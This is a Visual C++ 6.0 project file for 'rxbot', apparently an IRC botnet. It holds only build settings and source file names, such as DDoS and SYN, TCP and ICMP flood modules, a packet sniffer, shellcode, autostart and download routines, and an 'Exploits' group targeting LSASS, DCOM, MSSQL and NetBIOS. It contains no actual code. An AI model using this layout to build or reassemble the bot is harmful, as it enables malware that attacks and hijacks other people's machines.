# Microsoft Developer Studio Project File - Name="rxbot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=rxbot - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "rxbot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "rxbot.mak" CFG="rxbot - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "rxbot - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "executable"
# PROP BASE Intermediate_Dir "garbage"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "executable"
# PROP Intermediate_Dir "garbage"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 user32.lib /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "rxbot - Win32 Release"
# Begin Group "Code"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\code\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\code\aim.cpp
# End Source File
# Begin Source File

SOURCE=.\code\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\code\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\code\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ddos.cpp
# End Source File
# Begin Source File

SOURCE=.\code\download.cpp
# End Source File
# Begin Source File

SOURCE=.\code\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\code\findfile.cpp
# End Source File
# Begin Source File

SOURCE=.\code\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\code\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\code\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\code\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\code\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\code\net.cpp
# End Source File
# Begin Source File

SOURCE=.\code\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\code\pingudp.cpp
# End Source File
# Begin Source File

SOURCE=.\code\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\code\psniff.cpp
# End Source File
# Begin Source File

SOURCE=.\code\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\code\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\code\scan.cpp
# End Source File
# Begin Source File

SOURCE=.\code\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\code\session.cpp
# End Source File
# Begin Source File

SOURCE=.\code\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\code\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\code\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\code\tcpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\code\tftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\code\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\code\rxbot.cpp
# End Source File
# Begin Source File

SOURCE=.\code\visit.cpp
# End Source File
# Begin Source File

SOURCE=.\code\wildcard.cpp
# End Source File
# End Group
# Begin Group "Header"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\header\advscan.h
# End Source File
# Begin Source File

SOURCE=.\header\aim.h
# End Source File
# Begin Source File

SOURCE=.\header\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\header\autostart.h
# End Source File
# Begin Source File

SOURCE=.\header\configs.h
# End Source File
# Begin Source File

SOURCE=.\header\crc32.h
# End Source File
# Begin Source File

SOURCE=.\header\dcass.h
# End Source File
# Begin Source File

SOURCE=.\header\dcom.h
# End Source File
# Begin Source File

SOURCE=.\header\ddos.h
# End Source File
# Begin Source File

SOURCE=.\header\defines.h
# End Source File
# Begin Source File

SOURCE=.\header\download.h
# End Source File
# Begin Source File

SOURCE=.\header\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\header\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\header\externs.h
# End Source File
# Begin Source File

SOURCE=.\header\findfile.h
# End Source File
# Begin Source File

SOURCE=.\header\fphost.h
# End Source File
# Begin Source File

SOURCE=.\header\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\header\functions.h
# End Source File
# Begin Source File

SOURCE=.\header\globals.h
# End Source File
# Begin Source File

SOURCE=.\header\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\header\ident.h
# End Source File
# Begin Source File

SOURCE=.\header\includes.h
# End Source File
# Begin Source File

SOURCE=.\header\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\header\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\header\lsass1lsass.h
# End Source File
# Begin Source File

SOURCE=.\header\misc.h
# End Source File
# Begin Source File

SOURCE=.\header\mssql.h
# End Source File
# Begin Source File

SOURCE=.\header\mssqllsass.h
# End Source File
# Begin Source File

SOURCE=.\header\ndcass.h
# End Source File
# Begin Source File

SOURCE=.\header\net.h
# End Source File
# Begin Source File

SOURCE=.\header\netbios.h
# End Source File
# Begin Source File

SOURCE=.\header\netutils.h
# End Source File
# Begin Source File

SOURCE=.\header\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\header\ntlsa.h
# End Source File
# Begin Source File

SOURCE=.\header\passwd.h
# End Source File
# Begin Source File

SOURCE=.\header\pingudp.h
# End Source File
# Begin Source File

SOURCE=.\header\processes.h
# End Source File
# Begin Source File

SOURCE=.\header\psniff.h
# End Source File
# Begin Source File

SOURCE=.\header\random.h
# End Source File
# Begin Source File

SOURCE=.\header\redirect.h
# End Source File
# Begin Source File

SOURCE=.\header\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\header\scan.h
# End Source File
# Begin Source File

SOURCE=.\header\secure.h
# End Source File
# Begin Source File

SOURCE=.\header\session.h
# End Source File
# Begin Source File

SOURCE=.\header\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\header\synflood.h
# End Source File
# Begin Source File

SOURCE=.\header\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\header\tcpflood.h
# End Source File
# Begin Source File

SOURCE=.\header\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\header\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\header\threads.h
# End Source File
# Begin Source File

SOURCE=.\header\rxbot.h
# End Source File
# Begin Source File

SOURCE=.\header\visit.h
# End Source File
# Begin Source File

SOURCE=.\header\wildcard.h
# End Source File
# Begin Source File

SOURCE=.\header\wkssvc.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# Begin Group "Exploits"

# PROP Default_Filter "cpp"
# Begin Source File

SOURCE=.\code\clsass.cpp
# End Source File
# Begin Source File

SOURCE=.\code\dcass.cpp
# End Source File
# Begin Source File

SOURCE=.\code\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\code\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\code\lsass1lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\code\mssql.cpp
# End Source File
# Begin Source File

SOURCE=.\code\mssqllsass.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ndcass.cpp
# End Source File
# Begin Source File

SOURCE=.\code\netbios.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ntlsa.cpp
# End Source File
# Begin Source File

SOURCE=.\code\random.cpp
# End Source File
# Begin Source File

SOURCE=.\code\wkssvc.cpp
# End Source File
# End Group
# End Target
# End Project
